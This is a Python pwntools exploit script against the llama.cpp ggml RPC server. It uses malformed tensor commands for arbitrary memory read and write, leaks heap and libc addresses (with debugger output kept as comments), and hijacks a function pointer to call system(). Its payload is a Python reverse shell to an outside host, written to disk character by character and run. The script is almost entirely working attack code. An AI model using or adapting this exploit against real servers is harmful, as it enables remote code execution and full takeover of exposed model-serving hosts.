#!/usr/bin/env python3
from pwn import *
IP = 'localhost'
PORT = 50052
REVERSE_SHELL_IP = '114.114.114.114'
REVERSE_SHELL_PORT = 6666
CMD = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{REVERSE_SHELL_IP}",{REVERSE_SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''


'''
1 byte	|	8 bytes		|    ...
cmd     |	msg size	|  msg data
'''

# cmds
ALLOC_BUFFER = 0
SET_TENSOR   = 6
GET_TENSOR   = 7


io = remote('10.10.50.107',50052)

def send_cmd(cmd:int, buf:bytes):
    packet = b''
    packet += p8(cmd)
    packet += p64(len(buf))
    packet += buf
    io.send(packet)


def alloc_buf(size:int) -> int:
    send_cmd(ALLOC_BUFFER,p64(size))
    resp = io.recv(1024)

    heap_leak = u64(resp[0x8:0x10])
    return heap_leak

def arb_read(target_addr:int,valid_addr:int) -> int:
    tensor = flat({
        0x8: p32(28),
        12: p64(valid_addr),
        0x18: p32(0x41414141)*8,
        0xe0: p32(target_addr >> 32),

        0x128: p64(target_addr & 0x00000000ffffffff),
        0x130: p64(0x130)
    },filler = b'\x00',length=0x138)

    send_cmd(GET_TENSOR,tensor)
    resp = io.recv(1024)
    #log.info('leak ptrs ::')
    # for i in range (0,20):
    # 	log.info(f'{hex(u64(resp[i*8:i*8+8]))}')

    return u64(resp[0x8:0x10])



def arb_write(target_addr:int,valid_addr:int,waht:bytes) -> int:
    tensor = flat({
        0x8: p32(28),
        12: p64(valid_addr),
        0x18: p32(0x41414141)*8,
        0xe0: p32(target_addr >> 32),

        0x128: p64(target_addr & 0x00000000ffffffff),
        0x130: waht
    },filler = b'\x00',length=0x140)

    send_cmd(SET_TENSOR,tensor)

    return 0


def exec_cmd(io: remote, cmd: str) -> None:
    with log.progress('Executing command') as p:
        # clear file
        #arb_write(heap_leak, heap_leak, f'echo "">x\x00'.encode())
        arb_write(heap_leak + 0x28, heap_leak,p64(system_addr))  # void         (*GGML_CALL set_tensor) (ggml_backend_buffer_t buffer,       struct ggml_tensor * tensor, const void * data, size_t offset, size_t size);
        arb_read(0xdeadbeefcafebabe, heap_leak)  # call get_tensor to trigger the `jmp rax`

        # write chars
        for c in cmd:
            p.status(f'Writing {c}')
            if c == '"':
                c = '\\"'
            arb_write(heap_leak, heap_leak, f'echo -n "{c}">>x\x00'.encode())
            arb_write(heap_leak + 0x28, heap_leak,
                      p64(system_addr))  # void         (*GGML_CALL set_tensor) (ggml_backend_buffer_t buffer,       struct ggml_tensor * tensor, const void * data, size_t offset, size_t size);
            arb_read(0xdeadbeefcafebabe, heap_leak)  # call get_tensor to trigger the `jmp rax`

        # exec command
        arb_write(heap_leak, heap_leak, b'sh ./x\x00')
        arb_write(heap_leak + 0x28, heap_leak, p64(libc_system))
        arb_read(0xdeadbeefcafebabe, heap_leak)
    return None
    
alloc_buf(0x140)
io.close()

io = remote('10.10.50.107',50052)

heap_leak = alloc_buf(0x140)
log.info(f'heap_leak = {hex(heap_leak)}')
#arb_read(heap_leak-0x100,heap_leak)
# arb_write(heap_leak,heap_leak,b'/bin/sh\x00')
# arb_write(heap_leak+0x20,heap_leak,b'Q'*8)
# arb_write(0xdeadbeefcafecafe,heap_leak,b'A'*8)

set_tensor_addr = arb_read(heap_leak+0x20,heap_leak)
'''
gef➤  xi &ggml_backend_tensor_set
─────────────────────────────────── xinfo: 0x7ffff7ebc8b0 ─────────────────────────────────── 
Page: 0x00007ffff7e72000  →  0x00007ffff7f11000 (size=0x9f000)
Permissions: r-x
Pathname: /root/yzj/llama/llama.cpp-b3560/build-rpc/ggml/src/libggml.so
Offset (from page): 0x4a8b0
Inode: 0
Segment: .text (0x00007ffff7e75200-0x00007ffff7f10219)
Offset (from segment): 0x476b0
Symbol: ggml_backend_tensor_set

'''
log.info(f'set_tensor_addr:{hex(set_tensor_addr)}')
'''
gef➤  vmmap libggml.so
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path 
0x00007ffff7e62000 0x00007ffff7e72000 0x0000000000000000 r-- /root/yzj/llama/llama.cpp-b3560/build-rpc/ggml/src/libggml.so 
0x00007ffff7e72000 0x00007ffff7f11000 0x0000000000010000 r-x /root/yzj/llama/llama.cpp-b3560/build-rpc/ggml/src/libggml.so 
0x00007ffff7f11000 0x00007ffff7f30000 0x00000000000af000 r-- /root/yzj/llama/llama.cpp-b3560/build-rpc/ggml/src/libggml.so 
0x00007ffff7f30000 0x00007ffff7f32000 0x00000000000cd000 r-- /root/yzj/llama/llama.cpp-b3560/build-rpc/ggml/src/libggml.so 
0x00007ffff7f32000 0x00007ffff7f33000 0x00000000000cf000 rw- /root/yzj/llama/llama.cpp-b3560/build-rpc/ggml/src/libggml.so 

'''

libgmml_base = set_tensor_addr - 0x5a8b0
'''
gef➤  p/x &ggml_backend_tensor_set - 0x00007ffff7e62000
$1 = 0x5a8b0
'''
log.info(f'libgmml_base:{hex(libgmml_base)}')



puts_got_offset = 0xd0980
'''
>>> lib = ELF('/root/yzj/llama/llama.cpp-b3560/build-rpc/ggml/src/libggml.so')
>>> lib.got.puts
854400
>>> hex(lib.got.puts)
'0xd0980'
'''
puts_libc_offset = 0x80e50
'''
gef➤  xi &puts
─────────────────────────────────── xinfo: 0x7ffff7a64e50 ─────────────────────────────────── 
Page: 0x00007ffff7a0c000  →  0x00007ffff7ba1000 (size=0x195000)
Permissions: r-x
Pathname: /usr/lib/x86_64-linux-gnu/libc.so.6
Offset (from page): 0x58e50
Inode: 0
Segment: .text (0x00007ffff7a0c700-0x00007ffff7b9e93d)
Offset (from segment): 0x58750
Symbol: puts
gef➤  vmmap libc.so.6
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path 
0x00007ffff79e4000 0x00007ffff7a0c000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7a0c000 0x00007ffff7ba1000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7ba1000 0x00007ffff7bf9000 0x00000000001bd000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7bf9000 0x00007ffff7bfa000 0x0000000000215000 --- /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7bfa000 0x00007ffff7bfe000 0x0000000000215000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7bfe000 0x00007ffff7c00000 0x0000000000219000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6 
gef➤  p/x &puts - 0x00007ffff79e4000
$2 = 0x80e50
'''

libc_got_puts = arb_read(libgmml_base+puts_got_offset,heap_leak)
lib_base = libc_got_puts - puts_libc_offset
log.info(f'libc_got_puts:{hex(libc_got_puts)}')
log.info(f'lib_base:{hex(lib_base)}')

'''
[x] Opening connection to 10.10.50.107 on port 50052
[x] Opening connection to 10.10.50.107 on port 50052: Trying 10.10.50.107
[+] Opening connection to 10.10.50.107 on port 50052: Done
[*] heap_leak = 0x55555556c630
[*] set_tensor_addr:0x7ffff7ebbd80
[*] libgmml_base:0x7ffff7e614d0
[*] libc_got_puts:0x7ffff7e622f0
[*] lib_base:0x7ffff7de14a0
[*] Closed connection to 10.10.50.107 port 50052
'''

system_libc_offset = 0x50d70
system_addr = lib_base + system_libc_offset
log.info(f'system_addr:{hex(system_addr)}')

'''
gef➤  xi &system
─────────────────────────────────── xinfo: 0x7ffff7a34d70 ─────────────────────────────────── 
Page: 0x00007ffff7a0c000  →  0x00007ffff7ba1000 (size=0x195000)
Permissions: r-x
Pathname: /usr/lib/x86_64-linux-gnu/libc.so.6
Offset (from page): 0x28d70
Inode: 0
Segment: .text (0x00007ffff7a0c700-0x00007ffff7b9e93d)
Offset (from segment): 0x28670
Symbol: system
gef➤  vmmap libc.so.6
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path 
0x00007ffff79e4000 0x00007ffff7a0c000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7a0c000 0x00007ffff7ba1000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7ba1000 0x00007ffff7bf9000 0x00000000001bd000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7bf9000 0x00007ffff7bfa000 0x0000000000215000 --- /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7bfa000 0x00007ffff7bfe000 0x0000000000215000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7bfe000 0x00007ffff7c00000 0x0000000000219000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6 
gef➤  p/x &system - 0x00007ffff79e4000
$3 = 0x50d70
'''


# arb_write(heap_leak,heap_leak,b'/bin/sh\x00')
# arb_write(heap_leak+0x20,heap_leak,p64(system_addr))
# arb_write(0xdeadbeefcafecafe,heap_leak,b'A'*8)
#
#
# io.interactive()

exec_cmd(io,CMD)



